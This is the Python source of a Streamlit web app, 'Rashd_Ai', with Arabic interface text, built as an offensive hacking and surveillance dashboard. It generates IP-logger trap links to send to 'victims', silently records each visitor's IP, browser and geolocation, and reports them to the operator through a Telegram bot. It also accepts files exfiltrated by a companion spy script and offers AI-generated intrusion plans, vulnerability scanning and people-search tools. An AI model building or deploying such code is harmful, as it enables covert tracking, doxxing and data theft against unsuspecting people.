import streamlit as st
import os
import io
import json
from dotenv import load_dotenv
from PIL import Image
import base64
import requests
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# استيراد الوحدات المحلية
import config
import domain_osint
import ai_pentest
import port_scanner
import network_mapper
import google_dork
import vuln_scanner
import darkweb_search
import ai_threat
import email_osint
import phone_osint
import website_scan
import username_osint
import geoip_osint
import ip_tracker
import attack_surface
import ai_analysis
import report_generator
import telegram_bot
import location_tracker
import victim_logger
import exfiltrated_files

from ai_hacking import AIHackingAssistant
from ai_chat import AIChatAssistant

# ============= دالة إرسال التقارير لتلجرام =============
def send_telegram_report(report_message):
    """إرسال تقرير إلى تلجرام"""
    try:
        bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
        chat_id = config.get_key("TELEGRAM_CHAT_ID")
        
        if not bot_token or not chat_id:
            return False
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": report_message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, data=data)
        return response.status_code == 200
    except Exception as e:
        print(f"خطأ في إرسال التقرير: {str(e)}")
        return False


# تحميل .env
load_dotenv()

# إعداد الصفحة مع الأيقونة المخصصة
logo_path = config.LOGO_PATH
if os.path.exists(logo_path):
    logo_img = Image.open(logo_path)
    st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon=logo_img)
else:
    st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon="🛡️")

# ============= نظام التقاط بيانات الضحايا (Victim Capture) =============

# ============= دالة معالجة تحميل الملفات =============
def handle_file_upload(uploaded_file):
    """معالجة الملفات المرفوعة من spy_full.py"""
    try:
        if uploaded_file:
            success, result = exfiltrated_files.save_exfiltrated_file(
                uploaded_file,
                uploaded_file.name,
                original_path=uploaded_file.name,
                device_name="Unknown"
            )
            return success, result
        return False, "لا يوجد ملف"
    except Exception as e:
        return False, str(e)


def capture_victim_data():
    """التقاط بيانات الضحية عند فتح رابط التتبع"""
    query_params = st.query_params
    
    if 'target' in query_params and not st.session_state.get('victim_captured', False):
        try:
            # الحصول على عنوان IP الحقيقي للزائر
            user_ip = 'Unknown'
            try:
                ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
                if ip_response.status_code == 200:
                    user_ip = ip_response.json().get('ip', 'Unknown')
            except:
                pass
            
            # الحصول على معلومات المتصفح والجهاز من Streamlit
            user_agent = 'Unknown'
            try:
                if hasattr(st, 'browser'):
                    browser_info = st.browser
                    if hasattr(browser_info, 'user_agent'):
                        user_agent = browser_info.user_agent
            except:
                pass
            
            # الحصول على معلومات الموقع الجغرافي
            geo_data = None
            try:
                geo_response = requests.get(f'https://ip-api.com/json/{user_ip}?lang=ar&fields=country,city,lat,lon,isp,org,status', timeout=5)
                if geo_response.status_code == 200:
                    response_data = geo_response.json()
                    if response_data.get('status') == 'success':
                        geo_data = response_data
            except:
                pass
            
            # تسجيل بيانات الضحية
            victim_logger.log_victim_data(
                ip_address=user_ip,
                user_agent=user_agent,
                referrer=query_params.get('target', 'Unknown'),
                geo_data=geo_data
            )
            
            # وضع علامة على أن البيانات تم التقاطها
            st.session_state['victim_captured'] = True
            
            # إرسال تقرير لتلجرام
            try:
                victim_info = f"""
🎯 <b>تنبيه: تم اكتشاف ضحية جديدة!</b>

📍 <b>عنوان IP:</b> {user_ip}
🌍 <b>الدولة:</b> {geo_data.get('country', 'Unknown') if geo_data else 'Unknown'}
🏙️ <b>المدينة:</b> {geo_data.get('city', 'Unknown') if geo_data else 'Unknown'}
🏢 <b>مزود الخدمة:</b> {geo_data.get('isp', 'Unknown') if geo_data else 'Unknown'}
🎯 <b>المصيدة:</b> {query_params.get('target', 'Unknown')}
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                send_telegram_report(victim_info)
            except:
                pass
            
        except Exception as e:
            pass

# استدعاء دالة التقاط البيانات
capture_victim_data()

# التحقق من حالة الصلاحيات
if "developer_mode" not in st.session_state:
    st.session_state.developer_mode = False

# دالة لتحويل الصورة لـ base64 لعرضها بدون رابط قابل للضغط
def get_image_as_base64(path):
    with open(path, "rb") as f:
        data = f.read()
    return base64.b64encode(data).decode()

# --- مظهر مستقر واحترافي (Professional Dark Theme) ---
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
    
    /* الخط العام والاتجاه */
    html, body, [class*="st-"] {
        font-family: 'Cairo', sans-serif !important;
    }
    
    /* إصلاح اتجاه النصوص في المحتوى الرئيسي فقط */
    .main .block-container {
        direction: rtl;
        text-align: right;
    }
    
    /* لمسات بسيطة باللون الأخضر */
    .stButton>button {
        background-color: #00ff00 !important;
        color: black !important;
        font-weight: bold;
        border-radius: 8px;
        width: 100%;
        border: none;
    }
    
    h1, h2, h3 {
        color: #00ff00 !important;
        text-align: center;
    }
    
    /* منع الأيقونة من الفتح كصورة مستقلة */
    .logo-container img {
        pointer-events: none;
        user-select: none;
        border-radius: 50%;
        border: 3px solid #00ff00;
        box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
    }
    
    /* إصلاح الشريط الجانبي (Sidebar) ليكون مستقراً */
    [data-testid="stSidebar"] {
        background-color: #0e1117 !important;
        border-left: 1px solid #00ff00;
    }
    
    [data-testid="stSidebar"] .stMarkdown, [data-testid="stSidebar"] .stText {
        text-align: right !important;
        direction: rtl !important;
    }

    /* تحسين عرض التبويبات */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        direction: rtl;
    }
    
    .stTabs [data-baseweb="tab"] {
        height: 45px;
        white-space: nowrap;
        background-color: #1a1a1a !important;
        border-radius: 5px 5px 0 0 !important;
        color: #00ff00 !important;
    }
    
    .stTabs [aria-selected="true"] {
        border-bottom: 2px solid #00ff00 !important;
    }

    /* تنظيف النصوص العشوائية في الخلفية */
    .st-emotion-cache-10trblm {
        display: none !important;
    }
    </style>
    """, unsafe_allow_html=True)

# --- الشريط الجانبي للإعدادات ---
with st.sidebar:
    if os.path.exists(logo_path):
        img_base64 = get_image_as_base64(logo_path)
        st.markdown(f'<div class="logo-container" style="text-align:center; margin-top: 20px; margin-bottom: 20px;"><img src="data:image/png;base64,{img_base64}" width="130"></div>', unsafe_allow_html=True)
    
    st.markdown("<h2 style='text-align: center; font-size: 24px;'>⚙️ الإعدادات</h2>", unsafe_allow_html=True)
    
    # إظهار حالة الوضع (عام أو مطور)
    if st.session_state.developer_mode:
        st.success("🔓 أنت في وضع المطور")
        if st.button("🚪 تسجيل الخروج"):
            st.session_state.developer_mode = False
            st.rerun()
    else:
        st.info("👤 وضع الزائر العام")
        if st.button("🔐 دخول المطور"):
            st.session_state.show_dev_login = True
    
    # إظهار نموذج دخول المطور إذا تم الضغط على الزر
    if st.session_state.get('show_dev_login', False) and not st.session_state.developer_mode:
        st.markdown("---")
        st.markdown("### دخول المطور")
        dev_username = st.text_input("اسم المستخدم", key="sidebar_dev_user")
        dev_password = st.text_input("كلمة المرور", type="password", key="sidebar_dev_pass")
        if st.button("دخول"):
            if dev_username.strip() == config.ADMIN_USERNAME and dev_password.strip() == config.ADMIN_PASSWORD:
                st.session_state.developer_mode = True
                st.session_state.show_dev_login = False
                st.success("✅ تم التحقق!")
                st.rerun()
            else:
                st.error("❌ بيانات غير صحيحة")
    
    # إظهار الإعدادات فقط للمطور
    if st.session_state.developer_mode:
        st.divider()
        with st.expander("🔑 مفاتيح API"):
            groq_key = st.text_input("مفتاح GROQ", type="password", value=config.get_key("GROQ_API_KEY") or "")
            if groq_key: st.session_state["GROQ_API_KEY"] = groq_key
                
            tavily_key = st.text_input("مفتاح TAVILY", type="password", value=config.get_key("TAVILY_API_KEY") or "")
            if tavily_key: st.session_state["TAVILY_API_KEY"] = tavily_key
            
            github_token = st.text_input("توكين GITHUB", type="password", value=config.get_key("GITHUB_TOKEN") or "")
            if github_token: st.session_state["GITHUB_TOKEN"] = github_token

        with st.expander("📢 تلجرام"):
            tg_token = st.text_input("توكين البوت", type="password", value=config.get_key("TELEGRAM_BOT_TOKEN") or "")
            if tg_token: st.session_state["TELEGRAM_BOT_TOKEN"] = tg_token
            
            tg_chat_id = st.text_input("Chat ID", value=config.get_key("TELEGRAM_CHAT_ID") or "")
            if tg_chat_id: st.session_state["TELEGRAM_CHAT_ID"] = tg_chat_id

        st.divider()
        st.markdown("<h3 style='font-size: 18px;'>🛠️ حالة النظام</h3>", unsafe_allow_html=True)
        if config.get_key("GROQ_API_KEY"): st.success("✅ الذكاء الاصطناعي: متصل")
        else: st.warning("⚠️ الذكاء الاصطناعي: غير متصل")
        
        if config.get_key("TAVILY_API_KEY"): st.success("✅ محرك البحث: متصل")
        else: st.warning("⚠️ محرك البحث: غير متصل")
        
        # عداد الضحايا المكتشفين
        st.divider()
        victims = victim_logger.get_victims_data()
        st.metric("🎯 الضحايا المكتشفين", len(victims))

st.title("🛡️ Rashd_Ai")
st.markdown("<p style='text-align: center;'><code>>> تم تهيئة النظام بنجاح... تم منح الوصول...</code></p>", unsafe_allow_html=True)

# --- التبويبات العامة (متاحة للجميع) ---
public_tabs = st.tabs([
    "💬 المحادثة", "🌐 الدومين", "🔍 المواقع", "👤 المستخدم", "📍 الموقع", 
    "📧 التسريبات", "📱 الهاتف", "🌑 الدارك ويب", "🔌 المنافذ"
])

# 0. المحادثة
with public_tabs[0]:
    st.subheader("💬 المحادثة الأمنية الذكية")
    if "chat_history" not in st.session_state:
        st.session_state.chat_history = []

    for chat in st.session_state.chat_history:
        with st.chat_message(chat["role"]):
            st.markdown(chat["content"])

    if prompt := st.chat_input("اسألني أي شيء..."):
        st.session_state.chat_history.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)

        with st.chat_message("assistant"):
            with st.spinner("جاري التفكير..."):
                is_dev = st.session_state.get('developer_mode', False)
                assistant = AIChatAssistant(is_developer=is_dev)
                response = assistant.chat(prompt, st.session_state.chat_history[:-1])
                st.markdown(response)
                st.session_state.chat_history.append({"role": "assistant", "content": response})

# 1. تحليل الدومين
with public_tabs[1]:
    domain = st.text_input("أدخل الدومين", key="dom_in_v5")
    if st.button("تحليل الدومين"):
        with st.spinner("جاري العمل..."):
            try:
                whois = domain_osint.whois_lookup(domain)
                dns = domain_osint.dns_lookup(domain)
                subs = domain_osint.subdomain_scan(domain)
                st.code(whois, language="text")
                st.write("### النطاقات الفرعية المكتشفة", subs)
                st.session_state["domain"] = domain
                st.session_state["subs"] = subs
            except Exception as e:
                st.error(f"خطأ: {str(e)}")

# 2. فحص المواقع
with public_tabs[2]:
    url = st.text_input("رابط الموقع", key="url_in_v5")
    if st.button("فحص الموقع"):
        with st.spinner("جاري الفحص..."):
            try:
                tech = website_scan.detect_tech(url)
                st.write("### التقنيات المكتشفة", tech)
                st.session_state["scan"] = {"tech": tech}
            except Exception as e:
                st.error(f"خطأ: {str(e)}")

# 3. بحث عن المستخدم
with public_tabs[3]:
    user = st.text_input("اسم المستخدم", key="user_in_v5")
    if st.button("بحث عن المستخدم"):
        with st.spinner("جاري البحث العميق في منصات التواصل..."):
            res = username_osint.username_search(user)
            st.markdown(f"### 👤 نتيجة البحث عن {user}")
            st.markdown(res)

# 4. الموقع الجغرافي
with public_tabs[4]:
    st.subheader("📍 تحديد الموقع وتتبع الأهداف")
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.markdown("#### 🔍 تحديد موقع IP")
        st.info("يمكنك إدخال عنوان IP واحد أو عدة عناوين مفصولة بفواصل (مثل: 8.8.8.8, 1.1.1.1)")
        ip_input = st.text_area("عناوين IP", key="ip_in_v5", height=100)
        if st.button("بحث عن الموقع"):
            if ip_input.strip():
                with st.spinner("جاري جلب معلومات المواقع..."):
                    try:
                        ip_list = [ip.strip() for ip in ip_input.split(',')]
                        results = ip_tracker.get_ip_geolocation(ip_list)
                        
                        if results and isinstance(results, list) and len(results) > 0:
                            st.success("✅ تم جلب المعلومات بنجاح")
                            
                            import pandas as pd
                            try:
                                # تحويل النتائج إلى جدول
                                df = pd.DataFrame(results)
                                st.dataframe(df, use_container_width=True)
                                
                                # تحميل النتائج كـ CSV
                                csv = df.to_csv(index=False, encoding='utf-8-sig')
                                st.download_button(
                                    label="📥 تحميل النتائج (CSV)",
                                    data=csv,
                                    file_name="ip_geolocation_results.csv",
                                    mime="text/csv"
                                )
                            except Exception as e:
                                # إذا فشل الجدول، عرض البيانات الخام
                                st.warning(f"⚠️ لم يتمكن من عرض الجدول: {str(e)}")
                                st.json(results)
                        else:
                            st.error("❌ لم يتم الحصول على نتائج صحيحة")
                            if results:
                                st.json(results)
                    except Exception as e:
                        st.error(f"❌ خطأ: {str(e)}")
            else:
                st.warning("⚠️ يرجى إدخال عنوان IP على الأقل")
            
    with col2:
        st.markdown("#### ℹ️ معلومات إضافية")
        st.markdown(location_tracker.get_tracking_instructions())

# 5. تسريبات الإيميل
with public_tabs[5]:
    em = st.text_input("البريد الإلكتروني", key="em_in_v5")
    if st.button("فحص تسريبات الإيميل"):
        with st.spinner("جاري البحث في قواعد بيانات التسريبات..."):
            res = email_osint.email_search(em)
            st.markdown(f"### 📧 نتيجة فحص التسريبات لـ {em}")
            st.markdown(res)

# 6. بحث الهاتف
with public_tabs[6]:
    ph = st.text_input("رقم الهاتف", key="ph_in_v5")
    if st.button("بحث عن رقم الهاتف"):
        with st.spinner("جاري البحث العميق عن معلومات الرقم والحسابات المرتبطة..."):
            res = phone_osint.phone_lookup(ph)
            st.markdown(f"### 📱 نتيجة البحث عن الرقم {ph}")
            st.markdown(res)

# 7. الدارك ويب
with public_tabs[7]:
    dq_dark = st.text_input("كلمة مفتاحية للبحث", key="dk_in_v5")
    if st.button("بحث في الدارك ويب"):
        with st.spinner("جاري البحث في أرشيفات الدارك ويب..."):
            res = darkweb_search.darkweb_lookup(dq_dark)
            st.markdown(res)

# 8. المنافذ
with public_tabs[8]:
    pt = st.text_input("IP للفحص", key="pt_in_v5")
    if st.button("فحص المنافذ"):
        st.markdown(port_scanner.scan_ports(pt))

# ============= التبويبات الخاصة بالمطور (مخفية عن الزوار) =============
if st.session_state.developer_mode:
    st.divider()
    st.markdown("## 🔐 أدوات المطور المتقدمة")
    
    developer_tabs = st.tabs([
        "🎣 مصيدة IP", "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 جوجل دورك",
        "⚠️ الثغرات", "🗺️ الشبكة", "🚨 التهديدات", "💡 الخطة", "📄 التقارير"
    ])
    
    # 0. مصيدة IP (IP Logger)
    with developer_tabs[0]:
        st.subheader("🎣 مصيدة الـ IP - توليد روابط تتبع مباشرة")
        
        col1, col2 = st.columns(2)
        
        with col1:
            st.markdown("### 📋 كيفية الاستخدام:")
            st.markdown("""
            1. **أدخل اسماً للمصيدة** (مثلاً: "صورة مهمة")
            2. **انسخ الرابط** الذي سيظهر
            3. **أرسل الرابط** للهدف (عبر البريد، الرسائل، إلخ)
            4. **راقب النتائج** - سيظهر هنا فوراً عند فتح الهدف للرابط
            """)
            
            trap_name = st.text_input("🏷️ اسم المصيدة", placeholder="مثال: صورة مهمة")
            
            if st.button("🔗 توليد رابط التتبع"):
                if trap_name:
                    # توليد رابط التتبع
                    app_url = "https://rashdai.streamlit.app"
                    trap_link = f"{app_url}/?target={trap_name}"
                    
                    st.success("✅ تم توليد الرابط بنجاح!")
                    st.code(trap_link, language="text")
                    st.info("📌 انسخ هذا الرابط وأرسله للهدف")
                else:
                    st.warning("⚠️ يرجى إدخال اسم للمصيدة")
        
        with col2:
            st.markdown("### 📊 سجل الضحايا المكتشفين:")
            
            victims = victim_logger.get_victims_data()
            
            if victims:
                import pandas as pd
                
                # تحويل البيانات لجدول محسّن
                victims_display = []
                for victim in victims:
                    victims_display.append({
                        "⏰ الوقت": victim.get('timestamp', 'Unknown'),
                        "🌐 IP": victim.get('ip_address', 'Unknown'),
                        "🌍 الدولة": victim.get('country', 'Unknown'),
                        "🏙️ المدينة": victim.get('city', 'Unknown'),
                        "🔗 المتصفح": victim.get('browser', 'Unknown'),
                        "💻 نظام التشغيل": victim.get('os', 'Unknown'),
                        "📱 نوع الجهاز": victim.get('device_type', 'Unknown'),
                        "🏢 مزود الخدمة": victim.get('isp', 'Unknown'),
                        "🎯 المصيدة": victim.get('referrer', 'Unknown')
                    })
                
                df_victims = pd.DataFrame(victims_display)
                st.dataframe(df_victims, use_container_width=True)
                
                # زر التحميل
                csv = df_victims.to_csv(index=False, encoding='utf-8-sig')
                st.download_button(
                    label="📥 تحميل سجل الضحايا (CSV)",
                    data=csv,
                    file_name="victims_log.csv",
                    mime="text/csv"
                )
                
                # زر التنظيف
                if st.button("🗑️ مسح السجل"):
                    victim_logger.save_victims([])
                    st.success("✅ تم مسح السجل")
                    st.rerun()
            else:
                st.info("📭 لا توجد ضحايا مكتشفة حتى الآن")
    
    # 1. سطح الهجوم
    with developer_tabs[1]:
        if "subs" in st.session_state:
            st.image(attack_surface.draw_graph(st.session_state.get("domain"), st.session_state["subs"]))
        else: st.info("يرجى تحليل الدومين أولاً")

    # 2. التحليل الذكي
    with developer_tabs[2]:
        if "subs" in st.session_state:
            st.markdown(ai_analysis.analyze_ports(st.session_state.get("domain"), list(st.session_state["subs"].values())))
        else: st.info("يرجى تحليل الدومين أولاً")

    # 3. مساعد الهجوم
    with developer_tabs[3]:
        t = st.text_input("الهدف", key="ai_t_v5")
        p = st.text_input("المنافذ المفتوحة", key="ai_p_v5")
        if st.button("تحليل الهدف بالذكاء الاصطناعي"):
            st.markdown(AIHackingAssistant().analyze_target(t, p, ""))

    # 4. جوجل دورك
    with developer_tabs[4]:
        dq = st.text_input("Dork Query", key="dq_in_v5")
        if st.button("بحث جوجل دورك"):
            st.write(google_dork.search_dork(dq))

    # 5. الثغرات
    with developer_tabs[5]:
        vt = st.text_input("الهدف للفحص", key="vt_in_v5")
        if st.button("فحص الثغرات"):
            st.write(vuln_scanner.scan_vulnerabilities(vt))

    # 6. خريطة الشبكة
    with developer_tabs[6]:
        nt = st.text_input("الهدف للرسم", key="nt_in_v5")
        if st.button("رسم خريطة الشبكة"):
            network_map_result = network_mapper.map_network(nt, st.session_state.get("subs", {}))
            if isinstance(network_map_result, str):
                st.warning(network_map_result)
            else:
                st.image(network_map_result)

    # 7. التهديدات
    with developer_tabs[7]:
        tt = st.text_input("الهدف للتحليل", key="tt_in_v5")
        if st.button("تحليل التهديدات"):
            st.markdown(ai_threat.analyze_threat(tt))

    # 8. خطة الاختراق
    with developer_tabs[8]:
        pt_plan = st.text_input("الهدف للخطة", key="pt_plan_v5")
        if st.button("توليد خطة الاختراق"):
            st.markdown(ai_pentest.pentest_advice(pt_plan, [], ""))

    # 9. التقارير
    with developer_tabs[9]:
        if st.button("توليد تقرير PDF نهائي"):
            if "domain" in st.session_state:
                path = report_generator.create_report(st.session_state)
                with open(path, "rb") as f:
                    st.download_button("تحميل التقرير السري", f, file_name="classified_report.pdf")
            else: st.warning("يرجى إجراء فحوصات أولاً")
else:
    st.divider()
    st.info("🔐 **للوصول إلى أدوات المطور المتقدمة، يرجى تسجيل الدخول من القائمة الجانبية.**")
